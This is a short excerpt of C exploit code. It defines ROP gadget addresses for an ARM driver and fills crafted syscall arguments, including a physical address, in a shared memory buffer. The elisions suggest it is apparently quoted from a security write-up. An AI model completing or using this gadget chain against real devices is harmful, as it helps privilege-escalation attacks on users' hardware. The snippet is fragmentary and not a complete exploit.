...
#define DRV_POP_R0_R1_PC 0x11504 + 1
#define DRV_POP_R4_PC 0x176e + 1
#define DRV_POP_R3_R4_R5_PC 0x1710 + 1
#define DRV_BLX_R4_POP_R1_R2_R3_R4_R5_PC 0x1243a + 1
...
int main(int argc, char **argv)
{
	...
	uint64_t phys_addr;
	uint32_t *syscall_args = (uint32_t *)mmap_shared(0x1000, &phys_addr);
	syscall_args[0] = 0x81001019;
	syscall_args[1] = phys_addr + 8;
	syscall_args[2] = 0xFE500000;
	syscall_args[3] = 0;
	syscall_args[4] = 0x4;
	syscall_args[5] = 0x0;
